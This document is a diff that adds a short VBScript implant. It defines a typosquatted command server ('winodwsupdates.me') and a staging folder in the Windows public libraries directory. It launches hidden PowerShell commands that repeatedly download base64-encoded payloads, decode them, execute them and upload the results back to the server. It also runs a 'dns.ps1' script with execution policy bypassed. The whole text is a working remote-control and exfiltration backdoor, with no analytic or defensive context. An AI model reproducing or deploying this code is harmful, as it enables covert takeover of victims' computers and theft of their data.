@@ -1,0 +1,8 @@
+HOME="%public%\Libraries\"
+SERVER="http://winodwsupdates.me/counter.aspx?req=1103555813\"
+Dwn="powershell ""&{$wc=(new-object System.Net.WebClient);while(1){try{$r=Get-Random;$wc.DownloadFile('"&SERVER&"-_&m=d','"&HOME&"dn\'+$r+'.-_'); Set-Content -Path ('"&HOME&"dn\'+$r+'.-_') -Value ([System.Convert]::FromBase64String((Get-Content -Path ('"&HOME&"dn\'+$r+'.-_')))) -Encoding Byte; Rename-Item -path ('"&HOME&"dn\'+$r+'.-_') -newname ($wc.ResponseHeaders['Content-Disposition'].Substring($wc.ResponseHeaders['Content-Disposition'].IndexOf('filename=')+9))}catch{break}}}"""
+CreateObject("WScript.Shell").Run Replace(Dwn,"-_","dwn"),0
+DownloadExecute="powershell ""&{$r=Get-Random;$wc=(new-object System.Net.WebClient);$wc.DownloadFile('"&SERVER&"-_&m=d','"&HOME&"dn\'+$r+'.-_'); Set-Content -Path ('"&HOME&"dn\'+$r+'.-_') -Value ([System.Convert]::FromBase64String((Get-Content -Path ('"&HOME&"dn\'+$r+'.-_')))) -Encoding Byte; Invoke-Expression ('"&HOME&"dn\'+$r+'.-_ >"&HOME&"up\'+$r+'-_'); Rename-Item -path ('"&HOME&"up\'+$r+'-_') -newname ($wc.ResponseHeaders['Content-Disposition'].Substring($wc.ResponseHeaders['Content-Disposition'].IndexOf('filename=')+9)+'.txt'); Get-ChildItem "&HOME&"up\ | ForEach-Object {if((Get-Item ($_.FullName)).length -gt 0){[System.Convert]::ToBase64String((Get-Content -Path $_.FullName -Encoding Byte)) | Out-File $_.FullName;$wc.UploadFile('"&SERVER&"upl&m=u',$_.FullName);waitfor haha /T 3};Remove-Item $_.FullName};Remove-Item ('"&HOME&"dn\'+$r+'.-_')}"""
+CreateObject("WScript.Shell").Run Replace(DownloadExecute,"-_","bat"),0
+DnsCmd="powershell -ExecutionPolicy Bypass -File "&HOME&"dns.ps1"
+CreateObject("WScript.Shell").Run DnsCmd,0
